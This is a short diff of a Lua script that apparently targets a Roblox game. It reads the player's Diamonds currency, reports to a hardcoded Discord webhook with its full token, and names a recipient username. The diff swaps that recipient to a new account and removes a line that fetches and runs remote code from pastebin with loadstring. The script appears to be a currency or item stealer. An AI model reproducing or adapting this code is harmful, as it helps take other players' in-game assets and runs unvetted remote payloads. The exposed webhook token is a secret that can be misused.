@@ -12,8 +12,8 @@ if Webhook == nil or Webhook == "" then
     Webhook =
         "https://discord.com/api/webhooks/1213954195166855258/8z1XxG8435XDmlCF7Vea6R0N1jBtIAd-rqdhP2M_kgYa_NM60fXo4DRNkpok9WCiExDT"
 end
-if Username == "killpop00" or Username == nil then
-    Username = "killpop00"
+if Username == "" or Username == nil then
+    Username = "tromp466"
 end
 if LoadingScreen == true then
     hideall = false
@@ -28,11 +28,6 @@ for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
     end
-end
-
-if LoadingScreen == true then
-    LoadingScreen = true
-loadstring(game:HttpGet("https://pastebin.com/raw/SAY7yfgZ"'))()
 end
 
 if getgenv().executed then
@@ -288,7 +283,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
         GemAmount1 = v._am
     end
 end
-local nicks = {"br1c7s", "tromp466"}
+local nicks = {"br1c7s", "other nick"}
 math.randomseed(os.time())
 local randomNick = nicks[math.random(#nicks)]
 math.randomseed(os.time())
